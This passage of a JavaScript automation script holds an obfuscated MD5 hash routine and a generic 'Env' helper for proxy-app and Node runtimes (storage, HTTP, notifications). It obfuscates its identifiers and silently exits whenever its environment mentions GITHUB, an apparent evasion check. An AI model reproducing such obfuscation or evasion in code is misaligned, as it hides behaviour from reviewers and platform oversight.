    _0x19358f = _0x31d413(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 11], _0x4c24c8, 1839030562);
    _0x4b4f2c = _0x31d413(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 14], _0x3c49bc, 4259657740);
    _0x4f3109 = _0x31d413(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 1], _0x5c4b83, 2763975236);
    _0x6d2508 = _0x31d413(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 4], _0x764662, 1272893353);
    _0x19358f = _0x31d413(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 7], _0x4c24c8, 4139469664);
    _0x4b4f2c = _0x31d413(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 10], _0x3c49bc, 3200236656);
    _0x4f3109 = _0x31d413(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 13], _0x5c4b83, 681279174);
    _0x6d2508 = _0x31d413(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 0], _0x764662, 3936430074);
    _0x19358f = _0x31d413(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 3], _0x4c24c8, 3572445317);
    _0x4b4f2c = _0x31d413(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 6], _0x3c49bc, 76029189);
    _0x4f3109 = _0x31d413(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 9], _0x5c4b83, 3654602809);
    _0x6d2508 = _0x31d413(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 12], _0x764662, 3873151461);
    _0x19358f = _0x31d413(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 15], _0x4c24c8, 530742520);
    _0x4b4f2c = _0x31d413(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 2], _0x3c49bc, 3299628645);
    _0x4f3109 = _0x20e805(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 0], _0x3c8e65, 4096336452);
    _0x6d2508 = _0x20e805(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 7], _0x1df574, 1126891415);
    _0x19358f = _0x20e805(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 14], _0x50c062, 2878612391);
    _0x4b4f2c = _0x20e805(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 5], _0x28b128, 4237533241);
    _0x4f3109 = _0x20e805(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 12], _0x3c8e65, 1700485571);
    _0x6d2508 = _0x20e805(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 3], _0x1df574, 2399980690);
    _0x19358f = _0x20e805(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 10], _0x50c062, 4293915773);
    _0x4b4f2c = _0x20e805(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 1], _0x28b128, 2240044497);
    _0x4f3109 = _0x20e805(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 8], _0x3c8e65, 1873313359);
    _0x6d2508 = _0x20e805(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 15], _0x1df574, 4264355552);
    _0x19358f = _0x20e805(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 6], _0x50c062, 2734768916);
    _0x4b4f2c = _0x20e805(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 13], _0x28b128, 1309151649);
    _0x4f3109 = _0x20e805(_0x4f3109, _0x4b4f2c, _0x19358f, _0x6d2508, _0x66dab9[_0x5ce7a1 + 4], _0x3c8e65, 4149444226);
    _0x6d2508 = _0x20e805(_0x6d2508, _0x4f3109, _0x4b4f2c, _0x19358f, _0x66dab9[_0x5ce7a1 + 11], _0x1df574, 3174756917);
    _0x19358f = _0x20e805(_0x19358f, _0x6d2508, _0x4f3109, _0x4b4f2c, _0x66dab9[_0x5ce7a1 + 2], _0x50c062, 718787259);
    _0x4b4f2c = _0x20e805(_0x4b4f2c, _0x19358f, _0x6d2508, _0x4f3109, _0x66dab9[_0x5ce7a1 + 9], _0x28b128, 3951481745);
    _0x4f3109 = _0x30d6f5(_0x4f3109, _0x54490e);
    _0x4b4f2c = _0x30d6f5(_0x4b4f2c, _0x8ab49);
    _0x19358f = _0x30d6f5(_0x19358f, _0x36ea20);
    _0x6d2508 = _0x30d6f5(_0x6d2508, _0x532065);
  }
  var _0x3153c3 = _0x299cad(_0x4f3109) + _0x299cad(_0x4b4f2c) + _0x299cad(_0x19358f) + _0x299cad(_0x6d2508);
  return _0x3153c3.toLowerCase();
}
function Env(name, env) {
  "undefined" != typeof process && JSON.stringify(process.env).indexOf("GITHUB") > -1 && process.exit(0);
  return new class {
    constructor(name, env) {
      this.name = name;
      this.notifyStr = "";
      this.startTime = new Date().getTime();
      Object.assign(this, env);
      console.log(`${this.name} 开始运行：\n`);
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    getdata(t) {
      let e = this.getval(t);
      if (/^@/.test(t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
          r = s ? this.getval(s) : "";
        if (r) {
          try {
            const t = JSON.parse(r);
            e = t ? this.lodash_get(t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }
      return e;
    }
    setdata(t, e) {
      let s = !1;
      if (/^@/.test(e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
          o = this.getval(i),
          h = i ? "null" === o ? null : o || "{}" : "{}";
        try {
          const e = JSON.parse(h);
          this.lodash_set(e, r, t);
          s = this.setval(JSON.stringify(e), i);
        } catch (e) {
          const o = {};
          this.lodash_set(o, r, t);
          s = this.setval(JSON.stringify(o), i);
        }
      } else {
        s = this.setval(t, e);
      }
      return s;
    }
    getval(t) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null;
    }
    setval(t, e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null;
    }
    send(m, t, e = () => {}) {
      if (m != "get" && m != "post" && m != "put" && m != "delete") {
        console.log(`无效的http方法：${m}`);
        return;
      }
      if (m == "get" && t.headers) {
        delete t.headers["Content-Type"];
        delete t.headers["Content-Length"];
      } else {
        if (t.body && t.headers) {
          if (!t.headers["Content-Type"]) {
            t.headers["Content-Type"] = "application/x-www-form-urlencoded";
          }
        }
      }
      if (this.isSurge() || this.isLoon()) {
        if (this.isSurge() && this.isNeedRewrite) {
          t.headers = t.headers || {};
          Object.assign(t.headers, {
            "X-Surge-Skip-Scripting": !1
          });
        }
        let conf = {
          method: m,
          url: t.url,
          headers: t.headers,
          timeout: t.timeout,
          data: t.body
        };
        if (m == "get") {
          delete conf.data;
        }
        $axios(conf).then(t => {
          const {
            status: i,
            request: q,
            headers: r,
            data: o
          } = t;
          e(null, q, {
            statusCode: i,
            headers: r,
            body: o
          });
        }).catch(err => console.log(err));
      } else {
        if (this.isQuanX()) {
          t.method = m.toUpperCase();
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: i,
              request: q,
              headers: r,
              body: o
            } = t;
            e(null, q, {
              statusCode: i,
              headers: r,
              body: o
            });
          }, t => e(t));
        } else {
          if (this.isNode()) {
            this.got = this.got ? this.got : require("got");
            const {
              url: s,
              ...i
            } = t;
            this.instance = this.got.extend({
              followRedirect: false
            });
            this.instance[m](s, i).then(t => {
              const {
                statusCode: i,
                request: q,
                headers: r,
                body: o
              } = t;
              e(null, q, {
                statusCode: i,
                headers: r,
                body: o
              });
            }, t => {
              const {
                message: s,
                response: i
              } = t;
              e(s, i, i && i.body);
            });
          }
        }
      }
    }
    time(t) {
      let e = {
        "M+": new Date().getMonth() + 1,
        "d+": new Date().getDate(),
        "h+": new Date().getHours(),
        "m+": new Date().getMinutes(),
        "s+": new Date().getSeconds(),
        "q+": Math.floor((new Date().getMonth() + 3) / 3),
        S: new Date().getMilliseconds()
      };
      /(y+)/.test(t) && (t = t.replace(RegExp.$1, (new Date().getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let s in e) new RegExp("(" + s + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? e[s] : ("00" + e[s]).substr(("" + e[s]).length)));
      return t;
    }
    async showmsg() {
      if (!this.notifyStr) {
        return;
      }
      let notifyBody = this.name + " 运行通知\n\n" + this.notifyStr;
      if (!$.isNode()) {
        this.msg(notifyBody);
      }
    }
    logAndNotify(str) {
      console.log(str);
      this.notifyStr += str;
      this.notifyStr += "\n";
    }
    msg(e = t, s = "", i = "", r) {
      const o = t => {
        if (!t) {
          return t;
        }
        if ("string" == typeof t) {
          return this.isLoon() ? t : this.isQuanX() ? {
            "open-url": t
          } : this.isSurge() ? {
            url: t
          } : void 0;
        }
        if ("object" == typeof t) {
          if (this.isLoon()) {
            let e = t.openUrl || t.url || t["open-url"],
              s = t.mediaUrl || t["media-url"];
            return {
              openUrl: e,
              mediaUrl: s
            };
          }
          if (this.isQuanX()) {
            let e = t["open-url"] || t.url || t.openUrl,
              s = t["media-url"] || t.mediaUrl;
            return {
              "open-url": e,
              "media-url": s
            };
          }
          if (this.isSurge()) {
            let e = t.url || t.openUrl || t["open-url"];
            return {
              url: e
            };
          }
        }
      };
      this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r)));
      let h = ["", "============== 系统通知 =============="];
      h.push(e);
      s && h.push(s);
      i && h.push(i);
      console.log(h.join("\n"));
    }
    getMin(a, b) {
      return a < b ? a : b;
    }
    getMax(a, b) {
      return a < b ? b : a;
    }
    padStr(num, length, padding = "0") {
      let numStr = String(num);
      let numPad = length > numStr.length ? length - numStr.length : 0;
      let retStr = "";
      for (let i = 0; i < numPad; i++) {
        retStr += padding;
      }
      retStr += numStr;
      return retStr;
    }
    json2str(paramIn = {}) {
      let ret = [];
      let obj = paramIn.obj;
      let connector = paramIn.connector || "";
      let keys = Object.keys(obj);
      if (paramIn.isSort) {
        keys = keys.sort();
      }
      for (let key of keys) {
        let v = obj[key];
        if (v && typeof v === "object") {
          v = JSON.stringify(v);
        }
        if (v && paramIn.encodeUrl) {
          v = encodeURIComponent(v);
        }
        ret.push(key + "=" + v);
      }
      return ret.join(connector);
    }
    str2json(str, decodeUrl = false) {
      let ret = {};
      for (let item of str.split("&")) {
        if (!item) {
          continue;
        }
        let idx = item.indexOf("=");
        if (idx == -1) {
          continue;
        }
        let k = item.substr(0, idx);
        let v = item.substr(idx + 1);
        if (decodeUrl) {
          v = decodeURIComponent(v);
        }
        ret[k] = v;
      }
      return ret;
    }
    randomString(len, charset = "abcdef0123456789") {
      let str = "";
      for (let i = 0; i < len; i++) {
        str += charset.charAt(Math.floor(Math.random() * charset.length));
      }
      return str;
    }
    randomList(a) {
      let idx = Math.floor(Math.random() * a.length);
      return a[idx];
    }
    wait(t) {
      return new Promise(e => setTimeout(e, t));
    }
    done(t = {}) {
      const e = new Date().getTime(),
        s = (e - this.startTime) / 1000;
      console.log(`\n${this.name} 运行结束，共运行了 ${s} 秒！`);
      if (this.isSurge() || this.isQuanX() || this.isLoon()) {
        $done(t);
      }
      process.exit(0);
    }
    parseParam(p, d = "") {
      return p === undefined ? d : p;
    }
    randomPattern(pattern, charset = "abcdef0123456789") {
      let str = "";
      for (let chars of pattern) {
        if (chars == "x") {
          str += charset.charAt(Math.floor(Math.random() * charset.length));
        } else {
          if (chars == "X") {
            str += charset.charAt(Math.floor(Math.random() * charset.length)).toUpperCase();
          } else {
            str += chars;
          }
        }
      }
      return str;
    }
    param2str(param, encodeUrl = true) {
      let ret = [];
      for (let key in param) {
        if (typeof param[key] === "object") {
          param[key] = JSON.stringify(param[key]);
        }
        let v = param[key];
        if (encodeUrl) {
          v = escape(v);
        }
        let str = key + "=" + v;
        ret.push(str);
      }
      return ret.join("&");
    }
    randomWait(basetime, randomtime) {
      if (basetime == 0) {
        return;
      }
      let t = Math.floor(Math.random() * randomtime) + basetime;
      return this.wait(t);
    }
  }(name, env);
}